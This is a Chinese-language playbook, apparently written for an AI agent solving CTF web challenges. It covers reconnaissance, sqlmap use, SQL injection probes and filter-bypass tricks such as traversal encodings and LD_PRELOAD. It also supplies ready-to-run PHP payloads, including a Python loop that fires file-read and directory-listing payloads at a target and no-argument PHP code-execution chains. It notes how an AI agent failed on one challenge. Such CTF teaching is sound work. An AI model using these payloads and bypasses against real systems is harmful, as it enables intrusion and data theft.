# Skill · Web 打法

## 1. 先有目标

Web 题**必须有服务在跑**。开工前确认：

- `problem_prompt` 里有没有【远程地址】？有就直接连
- 没有地址的话，看附件是不是**源码包**——有源码时，flag 逻辑常常直接看得见
- 两样都没有 → `need_human` 请用户看看平台有没有开环境的入口

## 2. 第一件事永远是 curl

```bash
curl.exe -i "http://目标/"                  # 看状态码和响应头
curl.exe -i "http://目标/index.php?id=1"    # 带参数看回显
curl.exe -X POST -d "a=1" "http://目标/"    # POST
```

**没有 Burp 照样能做**：

| Burp 里做的事 | 你用什么 |
|---|---|
| 拦截改包 | 改 header/body 再发一次 |
| Repeater 重放 | 再 curl 一次 |
| Intruder 爆破 | 写 Python 循环（加 sleep，别把目标打挂） |
| 对比响应 | 存两次响应到文件，diff |

用 Python 的 `requests` 写脚本更顺手：

```python
import requests
r = requests.get("http://目标/", timeout=5)
print(r.status_code, r.headers)
print(r.text[:500])
```

## 3. 信息收集（按命中率）

1. **源码泄露**：`/www.zip`、`/www.tar.gz`、`/.git/HEAD`、`/.svn/entries`、
   `/index.php.bak`、`/.DS_Store`、`/robots.txt`
2. **目录探测**：有 `dirsearch` 就用（`python dirsearch.py -u 目标 -e php,html,zip`），
   没有就手写字典循环（注意线程数和延迟）
3. **指纹**：看响应头 `Server` / `X-Powered-By`，猜技术栈

## 4. 常见漏洞方向

| 特征 | 方向 |
|---|---|
| URL 有 `id=` / `?page=` | SQL 注入、文件包含 |
| 有登录框 | SQL 注入、弱口令、越权 |
| 上传功能 | 后缀绕过、内容绕过、解析漏洞 |
| `?url=` / `?file=` | SSRF、文件读取 |
| 有序列化字符串 | 反序列化 |
| 模板内容被渲染 | SSTI |

**SQL 注入有 sqlmap 就用**（这台机器已经配好路径）：

```bash
python E:\workbuddy\intrusion\tools\sqlmap\sqlmap.py -u "http://目标/?id=1" --batch
```

先手工确认能触发（比如 `id=1'` 报错），再上工具。

## 5. 拿到 shell / 读文件之后

- 找 flag：`cat /flag`、`cat /flag.txt`、`ls /`、`env`
- 找不到就看题目的其他提示

## 6. 什么时候停

- 3 步内连不上目标 → 地址有问题，`need_human` 让用户确认
- 目录扫描跑了 2 轮没东西 → 回去读源码（有附件的话）
- 有源码时**优先读源码**，比黑盒试快得多

---

## 7. 思考方式：Web 题的"结构优先"

黑盒乱试是效率最低的路。**有源码就先读源码**，一眼能省十几个请求。

### 读源码时只看三样

1. **入口**：哪个文件接收用户输入？（`index.php`、`app.py` 的 route）
2. **危险调用**：`eval` / `system` / `include` / `unserialize` / `exec` / 模板渲染
3. **数据流**：从"用户输入"到"危险调用"中间经过哪些过滤？

**画出这条线，你就知道绕过点什么。**

### 从"过滤函数"反推攻击面

| 看到 | 说明 | 怎么绕 |
|---|---|---|
| `preg_match('/flag/i')` | 禁了 flag 关键字 | 换路径（`/fla?`、`base64`、`glob`） |
| `str_replace('..','')` | 过滤上跳 | `....//`、`..././`、编码 |
| `disable_functions` 有 `system` | 命令执行被禁 | 找替代（`LD_PRELOAD`、`putenv`、`ini_set`） |
| `addslashes` | 转义引号 | 数字型注入、宽字节、二次注入 |
| `unserialize($_GET)` 无校验 | 反序列化 | 找 `__destruct` / `__wakeup` 链 |

### 一个参数一个参数地试，一次只改一处

```
基线：?id=1              → 正常回显
探测：?id=1'             → 报错？→ SQL
     ?id=1"             → 报错？→ 也是 SQL
     ?id=1 and 1=1      → 和基线一致？
     ?id=1 and 1=2      → 变了？→ 确认注入
```

**每次只改一个字符**，否则你无法归因。

## 8. 三种探针：回显 / 报错 / 时间

Web 上没有"打印中间量"，用这三样观察：

| 探针 | 怎么用 | 能看出什么 |
|---|---|---|
| **回显** | 响应长度、内容变化 | 有没有注入、有没有过滤 |
| **报错** | 打开 `display_errors`、构造语法错 | 路径、版本、SQL 结构 |
| **时间** | `sleep(2)` / 大计算 | 盲注、无回显时确认执行 |

**回显没变化不代表没执行** —— 可能结果被吞了，用时间盲注再确认一次。

## 9. 拿到 RCE 之后：先找 flag，别猜路径

**最大的效率陷阱：假设 flag 在 `/flag`。**

真实顺序：

```bash
env                  # ← 第一优先！很多平台把 flag 放环境变量
ls /                 # 根目录
cat /flag*           # 常见位置
find / -name "flag*" 2>/dev/null | head
```

**这次比赛的教训**：模型已经 dump 到 `FLAG=NSSCTF{...}` 了，
却继续去 `file_get_contents('/flag')`，白白浪费步数直到超时。

**规则：任何输出里出现 `XXX{...}` 形状的串，先当成 flag 对待。**

## 10. 上报 / 提交的检查

1. 先确认它是**从目标环境**拿到的（不是源码里的示例、不是自己构造的）
2. 前缀要换成平台要求的（`NSSCTF{}`）
3. 有不确定就写依据里，别硬交

---

## 11. PHP：被 disable_functions 挡住怎么办

### 第一步永远是看禁了什么

能执行 PHP 就先 dump 配置，**别猜**：

```php
echo ini_get('disable_functions');
echo ini_get('open_basedir');
phpinfo();            // 还能用就最省事
```

拿到禁用列表，再决定用哪条路——**这一步能省掉十次瞎试。**

### 读文件：同一个功能有十几种写法

PHP 的"读文件"从来不止 `file_get_contents`。按"最可能没被禁"往下排：

| 方法 | 代码 |
|---|---|
| `file()` | `print_r(file('/flag'));` |
| `show_source` | `show_source('/flag');` |
| `highlight_file` | `highlight_file('/flag');` |
| `SplFileObject` | `foreach(new SplFileObject('/flag') as $l) echo $l;` |
| `include` | `include('/flag');` |
| `readfile` | `readfile('/flag');` |
| `copy` | `copy('/flag','/tmp/x');` |
| `parse_ini_file` | `print_r(parse_ini_file('/flag'));` |
| `simplexml_load_file` | `var_dump(simplexml_load_file('/flag'));` |
| `fopen`+`fread` | 最基础，反而常被漏禁 |

### 列目录：同样有一堆替代

| 方法 | 代码 |
|---|---|
| `scandir` | `print_r(scandir('/'));` |
| `glob` | `print_r(glob('/flag*'));` |
| `DirectoryIterator` | `foreach(new DirectoryIterator('/') as $f) echo $f->getFilename(),"\n";` |
| **`glob://` 伪协议** | `$it=new DirectoryIterator("glob:///flag*"); foreach($it as $f) echo $f,"\n";` |
| `FilesystemIterator` | `foreach(new FilesystemIterator('/') as $f) echo $f,"\n";` |
| `RecursiveDirectoryIterator` | 同上，能递归 |
| `opendir`/`readdir` | 老写法，常常没禁 |
| `dir()` | 返回 Directory 对象 |

> **`glob://` 伪协议**是最容易被忽略的一条：`DirectoryIterator("glob:///……")`
> 把"目录遍历"变成了"流包装"，很多黑名单只拦函数名，拦不到它。

### 执行命令：`system` 系列全禁时

| 思路 | 说明 |
|---|---|
| 反引号 `` `ls` `` | 走 `shell_exec`，一起被禁就失效 |
| `pcntl_exec` | 需要 pcntl 扩展 |
| `LD_PRELOAD` | `putenv` + `mail()`/`error_log` 触发，需要 `mail` 可用 |
| `imap_open` | 老版本可利用 |
| `FFI` | PHP 7.4+，但通常没开 |
| 找已装的命令行工具 | `ImageMagick` 的 `convert`、`rsync`、`tar` 都可能带命令执行 |
| 反序列化 POP 链 | 有框架时最有效 |

### ⭐ 关键：写循环一次试完，不要一个个手动试

这一步是最费步数的地方。**你的步数是有限的，PHP 的替代函数是无限的。**

```python
# -*- coding: utf-8 -*-
import requests

url = "http://目标/"          # 按题目改
param = "c"                   # 注入的参数名

PAYLOADS = [
    'echo file_get_contents("/flag");',
    'print_r(file("/flag"));',
    'show_source("/flag");',
    'highlight_file("/flag");',
    'readfile("/flag");',
    'print_r(scandir("/"));',
    'echo implode("\\n", glob("/flag*"));',
    'echo implode("\\n", glob("/*"));',
    '$it=new DirectoryIterator("glob:///flag*"); foreach($it as $f) echo $f,"\\n";',
    '$it=new DirectoryIterator("/"); foreach($it as $f) echo $f->getFilename(),"\\n";',
    'foreach(new FilesystemIterator("/") as $f) echo $f,"\\n";',
    'echo ini_get("disable_functions");',
    'echo implode("\\n", $_ENV);',
    'echo getenv("FLAG");',
]

for p in PAYLOADS:
    try:
        r = requests.post(url, data={param: p}, timeout=8)
        t = r.text
        mark = ""
        if "NSSCTF{" in t or "flag{" in t:
            mark = "  <<<<< 命中！"
        elif len(t.strip()) > 0 and "Warning" not in t:
            mark = "  (有回显)"
        print("[%s] %s%s" % (r.status_code, p[:42], mark))
        if mark.startswith("  <<<<<"):
            print("   >>>", t[:500])
    except Exception as e:
        print("[ERR]", p[:42], e)
```

**一次运行 = 十几条路同时试完**，比"想一个、跑一个、再想一个"快十倍。

### 判断哪条路通了

| 现象 | 含义 |
|---|---|
| 回显里有目录名/文件名 | 列目录成功 |
| 回显里有 `NSSCTF{` | 直接是 flag |
| 空白 + `Warning` | 函数被禁（换下一个） |
| 空白 + HTTP 500 | 语法/权限错（换下一个） |
| 响应时间明显变长 | 说明执行了但被吞，考虑写文件/外带 |

### 元规则

**"被禁了什么"永远先去 dump 配置确认，不要靠猜。**
你猜错的每一次，都在消耗步数。

---

## 12. PHP 无参命令执行（`A()` 只能嵌套，不许带参数）★

### 识别

源码里有这种校验，就说明**括号里不能有任何字面量**：

```php
if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $code)){
    eval($code);
}else{
    die("O.o");
}
```

正则 `[^\W]+\((?R)?\)` 的意思是：只能是 `func()` 或 `func(func(...))`。
**出现 `,7`、`"abc"`、`'/'` 这类参数，整个 payload 被拒。**

### ⚠️ 最重要的诊断：`O.o` 是什么

**`O.o` 不是服务器错误，是「正则校验没过」。**

看到 `O.o` 时：

- ❌ 错误反应：换个 payload 再试
- ✅ 正确反应：**回去读校验逻辑**，看你的 payload 里哪个字符活不下来

这一个判断能省掉 10 步。

### 借参数的几个内部函数

括号里不能写参数，但可以从函数返回值里"借"：

| 需求 | 拿法 |
|---|---|
| `"."`（当前目录） | `pos(localeconv())` ← locale 的第一个元素就是小数点 |
| 当前目录路径 | `getcwd()` |
| 会话 id | `session_id()`（默认空串，当参数通常没用） |
| 请求头内容 | `getallheaders()`（塞进自定义 header 再取出来） |

### 常用 payload（都是纯嵌套，可直接用）

```php
/* 列目录 */
print_r(scandir(pos(localeconv())));
print_r(glob(pos(localeconv())));

/* 读"最后一个"文件 */
show_source(next(array_reverse(scandir(pos(localeconv())))));

/* 随机读一个文件（最实用，循环几次就能命中目标） */
show_source(array_rand(array_flip(scandir(pos(localeconv())))));
highlight_file(array_rand(array_flip(scandir(pos(localeconv())))));
readfile(array_rand(array_flip(scandir(pos(localeconv())))));

/* 环境 / 配置 */
print_r(get_defined_functions());
print_r(get_included_files());
print_r(file(getcwd()));
```

### 关键技巧：`array_flip` + 不带第二参数的 `array_rand`

```php
scandir(".")      → [0=>".", 1=>"..", 2=>"flag.php", ...]
array_flip(...)   → ["."=>0, ".."=>1, "flag.php"=>2, ...]
array_rand(...)   → 随机返回一个 **key**（这里就是文件名）
```

**`array_rand` 不带第二个参数时返回单个随机 key**；带了 `,7` 就返回数组，
`show_source(数组)` 直接报错。**这就是那次的 bug。**

### 循环读，不要指望一次命中

```python
PAY = 'show_source(array_rand(array_flip(scandir(pos(localeconv())))));'
for i in range(30):
    out = go(PAY)
    if 'NSSCTF{' in out:
        print(re.search(r'NSSCTF\{[^}]*\}', out).group(0)); break
```

6 个文件里 1 个是目标，30 次命中概率 > 99%。**成本远低于继续瞎想。**

### 实战记录（强网杯 12202）

```
NSSCTF{...}
```

模型用了 20 步没做出来，死因就是那个 `,7`。
人工去掉这一个参数后，**第 5 次随机读就命中**。

> **教训：卡住的时候，先问「我的输入到底被什么规则筛掉了」，
> 而不是继续换输入。**



